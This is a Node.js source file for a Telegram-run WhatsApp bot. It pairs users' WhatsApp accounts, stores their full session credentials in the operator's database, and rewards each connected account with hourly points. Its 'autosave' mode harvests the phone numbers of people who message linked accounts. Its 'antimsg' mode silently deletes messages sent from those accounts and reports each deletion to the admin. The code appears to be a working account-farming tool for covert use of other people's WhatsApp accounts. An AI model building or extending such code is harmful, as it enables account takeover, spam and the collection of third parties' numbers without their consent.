import 'dotenv/config';
import { 
    useMultiFileAuthState, 
    makeWASocket, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    Browsers,
    jidNormalizedUser
} from '@whiskeysockets/baileys';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import pino from 'pino';
import express from 'express';
import { Boom } from '@hapi/boom';

import { setupTelegramCommands } from './telegram_commands.js';
import { initDb, saveSessionToDb, getAllSessions, deleteSessionFromDb, addNumbersToDb, getBlacklist, getShortId, saveShortId, deleteShortId, addPoints } from './db.js';

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const NOTIFICATION_TOKEN = process.env.NOTIFICATION_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID;
const SESSIONS_DIR = './sessions';

if (!TELEGRAM_TOKEN || !NOTIFICATION_TOKEN || !ADMIN_ID) { console.error('Missing Tokens'); process.exit(1); }

const app = express();
const PORT = process.env.PORT || 10000;
app.get('/', (req, res) => res.send('Ultarbot Pro Running'));
app.listen(PORT, () => console.log(`Server on ${PORT}`));

const mainBot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const notificationBot = new TelegramBot(NOTIFICATION_TOKEN, { polling: false });

const clients = {}; 
const shortIdMap = {}; 
const antiMsgState = {}; 
const autoSaveState = {}; 
const notificationCache = {};

if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

function generateShortId() { return Math.random().toString(36).substring(2, 7); }
function makeSessionId() { return `Ultarbot_${Date.now()}`; }
const getRandomBrowser = () => Browsers.macOS('Chrome');

// LOGGING
async function updateAdminNotification(message, isNew = false) {
    // Simple direct message for now to ensure delivery
    try {
        await notificationBot.sendMessage(ADMIN_ID, message, { parse_mode: 'Markdown' });
    } catch (e) { console.error(e.message); }
}

// POINTS LOOP
setInterval(async () => {
    const sessions = await getAllSessions();
    for (const session of sessions) {
        if (clients[session.session_id] && session.telegram_user_id) {
            await addPoints(session.telegram_user_id, 10, 'TASK');
        }
    }
}, 3600000);

async function startClient(folder, targetNumber = null, chatId = null, telegramUserId = null) {
    const sessionPath = path.join(SESSIONS_DIR, folder);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: getRandomBrowser(), 
        version,
        connectTimeoutMs: 60000,
        markOnlineOnConnect: true,
        emitOwnEvents: true,
        syncFullHistory: true
    });

    sock.ev.on('creds.update', async () => {
        await saveCreds();
        try {
            const credsFile = path.join(sessionPath, 'creds.json');
            if (fs.existsSync(credsFile)) {
                const content = fs.readFileSync(credsFile, 'utf-8');
                let phone = "pending";
                const id = Object.keys(shortIdMap).find(k => shortIdMap[k].folder === folder);
                if (id) phone = shortIdMap[id].phone;
                
                const antimsg = antiMsgState[id] || false;
                const autosave = autoSaveState[id] || false;
                
                await saveSessionToDb(folder, phone, content, telegramUserId || 'admin', antimsg, autosave);
            }
        } catch(e) {}
    });

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const myShortId = Object.keys(shortIdMap).find(k => shortIdMap[k].folder === folder);
        if (!myShortId) return;

        for (const msg of messages) {
            if (!msg.message) continue;
            if (msg.message.protocolMessage) continue; 

            const remoteJid = msg.key.remoteJid;
            const isFromMe = msg.key.fromMe;
            const myJid = jidNormalizedUser(sock.user?.id || "");
            
            if (!isFromMe && autoSaveState[myShortId]) {
                if (remoteJid.endsWith('@s.whatsapp.net')) {
                    await addNumbersToDb([remoteJid.split('@')[0]]);
                }
            }

            const content = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
            if (content.toLowerCase() === '.alive') {
                await sock.sendMessage(remoteJid, { text: 'Ultarbot is Online' }, { quoted: msg });
            }

            if (antiMsgState[myShortId] && isFromMe) {
                if (remoteJid === myJid || content.startsWith('.') || remoteJid === 'status@broadcast') return;

                try {
                    await sock.sendMessage(remoteJid, { delete: msg.key });
                    const target = remoteJid.split('@')[0];
                    const now = Date.now();
                    if (now - (notificationCache[target] || 0) > 10000) {
                        updateAdminNotification(`[ANTIMSG] Deleted message from \`${myShortId}\` to +${target}`);
                        notificationCache[target] = now;
                    }
                } catch (e) {}
            }
        }
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            const userJid = jidNormalizedUser(sock.user.id);
            const phoneNumber = userJid.split('@')[0];
            
            let myShortId = await getShortId(folder);
            if (!myShortId) {
                myShortId = generateShortId();
                await saveShortId(folder, myShortId);
            }
            
            shortIdMap[myShortId] = { folder, phone: phoneNumber, chatId: telegramUserId };
            clients[folder] = sock;

            updateAdminNotification(`🟢 Account Connected: +${phoneNumber} (ID: \`${myShortId}\`)`);

            if (chatId) {
                mainBot.sendMessage(chatId, `Connected!\nID: \`${myShortId}\``, { parse_mode: 'Markdown' });
            }
        }

        if (connection === 'close') {
            let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            if (reason === 403 || reason === DisconnectReason.loggedOut) {
                updateAdminNotification(`🔴 Account Logged Out/Banned: +${shortIdMap[folder]?.phone || 'Unknown'}`);
                await deleteSessionFromDb(folder);
                deleteShortId(folder);
                if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
                delete clients[folder];
            } else {
                startClient(folder, null, chatId, telegramUserId);
            }
        }
    });

    if (targetNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(targetNumber);
                if (chatId) mainBot.sendMessage(chatId, `Code: \`${code}\``, { parse_mode: 'Markdown' });
            } catch (e) {}
        }, 3000);
    }
}

async function boot() {
    await initDb(); 
    const savedSessions = await getAllSessions(null);
    
    for (const session of savedSessions) {
        const folderPath = path.join(SESSIONS_DIR, session.session_id);
        if (!fs.existsSync(folderPath)) fs.mkdirSync(folderPath, { recursive: true });
        if (session.creds) fs.writeFileSync(path.join(folderPath, 'creds.json'), session.creds);
        
        const shortId = await getShortId(session.session_id) || generateShortId();
        shortIdMap[shortId] = { folder: session.session_id, phone: session.phone, chatId: session.telegram_user_id };
        
        if (session.antimsg) antiMsgState[shortId] = true;
        if (session.autosave) autoSaveState[shortId] = true;

        startClient(session.session_id, null, null, session.telegram_user_id);
    }
}

setupTelegramCommands(mainBot, notificationBot, clients, shortIdMap, SESSIONS_DIR, startClient, makeSessionId, antiMsgState, autoSaveState);
boot();
